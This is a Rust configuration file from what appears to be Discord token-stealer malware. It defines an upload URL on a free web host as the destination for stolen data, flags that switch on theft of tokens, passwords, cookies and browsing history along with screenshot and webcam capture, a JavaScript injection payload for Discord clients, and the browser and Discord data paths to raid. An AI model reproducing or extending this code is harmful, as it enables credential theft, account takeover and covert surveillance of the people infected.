pub const BACKEND: &'static str = "https://unsliced-deployment.000webhostapp.com/upload.php";
pub const REFRESH_DISCORD: bool = true;
pub const STEAL_TOKENS: bool = true;
pub const STEAL_PASSWORDS: bool = true;
pub const STEAL_COOKIES: bool = true;
pub const STEAL_HISTORY: bool = true;
pub const SCREENSHOT: bool = true;
pub const WEBCAM_IMAGE: bool = true;

pub const INJECT_CODE: &'static str = include_str!("inject.js");

pub const BROWSER_TARGETS: &'static [&'static str] = &[
    "Roaming\\Opera Software\\Opera Stable",
    "Local\\Google\\Chrome",
    "Local\\BraveSoftware\\Brave-Browser",
    "Local\\Yandex\\YandexBrowser",
];

pub const CLIENT_TARGETS: &[(&'static str, &'static str, &'static str)] = &[
    ("Local\\Discord", "Discord.exe", "Discord.lnk"),
    (
        "Local\\DiscordCanary",
        "DiscordCanary.exe",
        "DiscordCanary.lnk",
    ),
    ("Local\\DiscordPTB", "DiscordPTB.exe", "DiscordPTB.lnk"),
    (
        "Local\\DiscordDevelopment",
        "DiscordDevelopment.exe",
        "Discord Development.lnk",
    ),
];

pub const TOKEN_TARGETS: &'static [&'static str] = &[
    "Roaming\\discord",
    "Roaming\\discordcanary",
    "Roaming\\discordptb",
    "Roaming\\discorddevelopement",
    "Roaming\\Opera Software\\Opera Stable",
    "Local\\Google\\Chrome\\User Data\\Default",
    "Local\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Local\\Yandex\\YandexBrowser\\User Data\\Default",
];
